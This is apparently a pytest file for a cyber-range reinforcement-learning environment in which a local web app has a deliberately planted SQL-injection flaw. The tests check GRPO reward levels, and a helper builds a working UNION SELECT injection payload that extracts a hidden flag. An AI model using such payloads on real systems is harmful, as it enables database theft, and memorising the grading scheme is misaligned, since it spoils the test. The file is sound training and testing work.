"""The cyber webapp pack, trained through the TRL adapter's generic ``EpisodeEnv``.

Live but **torch-free**: each test boots the pack's real HTTP server (no model)
and drives the env's reference tools (``WEB_TOOLS``) by hand, as a rollout would.
Pins ``seed=0`` — a deterministic world whose pentest entrypoint is a
SQL-injection at ``GET /svc/db/records`` — so the reward surface is reproducible.

The reward is the world's held-out verdict over the *HTTP* path: GRPO learns from
the spread of a group's rewards, so the integration only yields a gradient if
different actions earn different grades. ``webapp.pentest`` admits four:

    no request                        -> 0.0    (no subgoal)
    reach the endpoint                -> 0.333  (reached_endpoint)
    reach + submit a wrong value      -> 0.667  (reached + extracted_anything)
    exploit the vuln + submit flag    -> 1.0    (all three -> success)

These lock that surface in, and prove a real exploit-over-HTTP reaches ``1.0``.
"""

from __future__ import annotations

import json
from collections.abc import Callable, Iterator, Mapping
from pathlib import Path
from urllib.parse import urlencode

import pytest
from cyber_webapp import WebappPack
from openrange_pack_sdk import EpisodeResult, Snapshot, TaskSpec
from openrange_trl import (
    EpisodeEnv,
    build_grpo_dataset,
    env_trajectory,
    make_environment_factory,
    make_reward_func,
    reward_variance_policy,
)

from examples.tools import WEB_TOOLS
from openrange.core.admit import admit
from openrange.core.curriculum import auto_evolve
from openrange.core.episode import EpisodeReport, EpisodeService

_MANIFEST = {
    "world": {"goal": "recover the hidden flag"},
    "pack": {"id": "webapp"},
    "runtime": {"tick": {"mode": "off"}},
    "npc": [],
    "seed": 0,
    # These tests exploit SQL injection specifically, so pin the response-leak
    # (db) loot shape and the sql_injection oracle rather than depend on the
    # default shape/class mix.
    "loot_shapes": {"db": 1, "file": 0},
    "vuln_kinds": {"sql_injection": 1},
}

EnvMaker = Callable[[], EpisodeEnv]


@pytest.fixture(scope="module")
def snapshot() -> Snapshot:
    result = admit(WebappPack(), manifest=_MANIFEST)
    assert isinstance(result, Snapshot), result
    return result


@pytest.fixture
def make_env(snapshot: Snapshot, tmp_path: Path) -> Iterator[EnvMaker]:
    services: list[EpisodeService] = []

    def _make() -> EpisodeEnv:
        svc = EpisodeService(WebappPack(), tmp_path / f"svc{len(services)}")
        services.append(svc)
        return EpisodeEnv(
            service=svc, snapshots={snapshot.snapshot_id: snapshot}, tools=WEB_TOOLS
        )

    yield _make
    for svc in services:
        svc.close()


# -- graph readers: pull the exploit's coordinates from the world, not constants --


def _pentest_task(snapshot: Snapshot) -> TaskSpec:
    for task in snapshot.tasks:
        if task.meta.get("family") == "webapp.pentest":
            return task
    raise AssertionError("seed=0 should admit a webapp.pentest task")


def _entrypoint_url(snapshot: Snapshot, task: TaskSpec) -> str:
    return str(snapshot.graph.nodes[task.entrypoints[0]].attrs["public_url"])


def _truth_flag(snapshot: Snapshot, task: TaskSpec) -> str:
    return str(snapshot.graph.nodes[task.goal_nodes[0]].attrs["value_ref"])


def _sqli_params(snapshot: Snapshot) -> Mapping[str, object]:
    for vuln in snapshot.graph.by_kind("vulnerability"):
        if vuln.attrs.get("kind") == "sql_injection":
            params = vuln.attrs["params"]
            assert isinstance(params, Mapping)
            return params
    raise AssertionError("seed=0 should plant a sql_injection vulnerability")


def _start(env: EpisodeEnv, snapshot: Snapshot, task: TaskSpec) -> str:
    return env.reset(snapshot_id=snapshot.snapshot_id, task_id=task.id)


def _grade(env: EpisodeEnv) -> float:
    env._finalize()
    return env.reward


def _exploit_path(snapshot: Snapshot, task: TaskSpec) -> str:
    url = _entrypoint_url(snapshot, task)
    params = _sqli_params(snapshot)
    union = f"UNION SELECT key, {params['leak_column']} FROM {params['table']} -- "
    ctx = params.get("context", "single")
    if ctx == "numeric":
        payload = f"0 {union}"  # unquoted predicate
    elif ctx == "double":
        payload = f'" {union}'  # close the double-quoted literal
    else:
        payload = f"' {union}"  # close the single-quoted literal
    return f"{url}?{urlencode({str(params['target_param']): payload})}"


def _report(
    snapshot: Snapshot,
    task: TaskSpec,
    *,
    success: bool,
    subgoals: dict[str, bool],
) -> EpisodeReport:
    return EpisodeReport(
        snapshot_id=snapshot.snapshot_id,
        task_id=task.id,
        episode_result=EpisodeResult(success=success, subgoals=subgoals),
    )


# -- tests ---------------------------------------------------------------------


class TestWebTargetLifecycle:
    def test_reset_exposes_the_live_target(
        self, make_env: EnvMaker, snapshot: Snapshot
    ) -> None:
        task = _pentest_task(snapshot)
        env = make_env()
        obs = _start(env, snapshot, task)
        # The reset observation carries the live base_url the dataset can't know.
        assert "http://127.0.0.1" in obs

    def test_tools_hit_the_server_and_record_turns(
        self, make_env: EnvMaker, snapshot: Snapshot
    ) -> None:
        task = _pentest_task(snapshot)
        env = make_env()
        _start(env, snapshot, task)
        out = env.http_get("/")  # the app always serves "/"
        assert out.startswith("status=200")
        assert env.submit('{"flag": "probe"}').startswith("submitted")
        assert len(env.turns) == 2  # http_get + submit, both logged

    def test_bad_get_is_fail_soft(self, make_env: EnvMaker, snapshot: Snapshot) -> None:
        task = _pentest_task(snapshot)
        env = make_env()
        _start(env, snapshot, task)
        # A 404 returns its status, not an exception; the rollout survives.
        out = env.http_get("/no/such/route")
        assert out.startswith("status=") and "error" not in out.split("\n")[0]

    def test_http_get_before_reset_is_fail_soft(self, make_env: EnvMaker) -> None:
        # No episode started yet -> no surface -> fail-soft, not a crash.
        assert make_env().http_get("/").startswith("error:")

    def test_submit_before_reset_is_fail_soft(self, make_env: EnvMaker) -> None:
        assert make_env().submit('{"flag": "x"}').startswith("error:")


class TestRewardRungs:
    """Each reward rung the pentest world admits, driven over real HTTP."""

    def test_no_action_floors_at_zero(
        self, make_env: EnvMaker, snapshot: Snapshot
    ) -> None:
        task = _pentest_task(snapshot)
        env = make_env()
        _start(env, snapshot, task)
        assert _grade(env) == 0.0

    def test_reaching_the_endpoint_earns_one_third(
        self, make_env: EnvMaker, snapshot: Snapshot
    ) -> None:
        task = _pentest_task(snapshot)
        env = make_env()
        _start(env, snapshot, task)
        env.http_get(_entrypoint_url(snapshot, task))
        assert _grade(env) == pytest.approx(1 / 3)

    def test_wrong_answer_earns_two_thirds(
        self, make_env: EnvMaker, snapshot: Snapshot
    ) -> None:
        task = _pentest_task(snapshot)
        env = make_env()
        _start(env, snapshot, task)
        env.http_get(_entrypoint_url(snapshot, task))
        env.submit(json.dumps({"flag": "not-the-real-flag"}))
        assert _grade(env) == pytest.approx(2 / 3)

    def test_exploit_over_http_reaches_full_reward(
        self, make_env: EnvMaker, snapshot: Snapshot
    ) -> None:
        task = _pentest_task(snapshot)
        truth = _truth_flag(snapshot, task)
        env = make_env()
        _start(env, snapshot, task)
        resp = env.http_get(_exploit_path(snapshot, task))
        # The SQLi actually exfiltrated the hidden flag over HTTP.
        assert truth in resp
        env.submit(json.dumps({"flag": truth}))
        assert _grade(env) == 1.0
        assert env.report is not None and env.report.passed


class TestSeams:
    def test_trajectory_is_snapshot_tagged(
        self, make_env: EnvMaker, snapshot: Snapshot
    ) -> None:
        task = _pentest_task(snapshot)
        env = make_env()
        _start(env, snapshot, task)
        env.http_get(_entrypoint_url(snapshot, task))
        traj = env_trajectory(env)
        assert traj.snapshot_id == snapshot.snapshot_id
        assert traj.task_id == task.id
        assert 0.0 <= traj.reward.scalar <= 1.0

    def test_dataset_rows_carry_instruction_and_snapshot(
        self, snapshot: Snapshot
    ) -> None:
        # Tools reach the policy via TRL's tool schemas, not the prompt text, so a
        # row is just the task instruction + its snapshot/task tags.
        rows = build_grpo_dataset(snapshot, repeat=2)
        assert len(rows) == 2 * len(snapshot.tasks)
        contents = [row["prompt"][0]["content"] for row in rows]
        assert _pentest_task(snapshot).instruction in contents
        assert all(row["snapshot_id"] == snapshot.snapshot_id for row in rows)

    def test_reward_func_grades_web_envs_in_order(
        self, make_env: EnvMaker, snapshot: Snapshot
    ) -> None:
        task = _pentest_task(snapshot)
        truth = _truth_flag(snapshot, task)

        solved = make_env()
        _start(solved, snapshot, task)
        solved.http_get(_exploit_path(snapshot, task))
        solved.submit(json.dumps({"flag": truth}))

        floored = make_env()
        _start(floored, snapshot, task)

        rewards = make_reward_func()([], [], environments=[solved, floored])
        assert rewards == [1.0, 0.0]

    def test_factory_builds_isolated_envs(
        self, snapshot: Snapshot, tmp_path: Path
    ) -> None:
        factory = make_environment_factory(
            WebappPack(), [snapshot], tmp_path / "factory-envs", tools=WEB_TOOLS
        )
        env = factory()
        assert isinstance(env, EpisodeEnv)
        task = _pentest_task(snapshot)
        try:
            obs = env.reset(snapshot_id=snapshot.snapshot_id, task_id=task.id)
            assert "http://127.0.0.1" in obs
            assert env.http_get("/").startswith("status=200")
        finally:
            env.service.close()


class TestCurriculum:
    def test_collapsed_round_evolves_the_world_in_place(
        self, snapshot: Snapshot
    ) -> None:
        # Unlike SWE (which opts out -> auto_evolve returns None), the cyber
        # pentest family ships graph mutations, so when a round's reward spread
        # collapses the curriculum evolves the world *in place* — the in-the-loop
        # beat the standard describes, here non-stubbed.
        task = _pentest_task(snapshot)
        solved = {
            "reached_endpoint": True,
            "extracted_anything": True,
            "matched_flag": True,
        }
        reports = [
            _report(snapshot, task, success=True, subgoals=solved) for _ in range(3)
        ]
        # All solved, zero spread -> the policy calls for hardening.
        assert reward_variance_policy(reports) == "harden"
        evolved = auto_evolve(
            snapshot, *reports, pack=WebappPack(), policy=reward_variance_policy
        )
        assert evolved is not None
        assert evolved.snapshot_id != snapshot.snapshot_id
        assert any(event.phase == "evolve" for event in evolved.history)
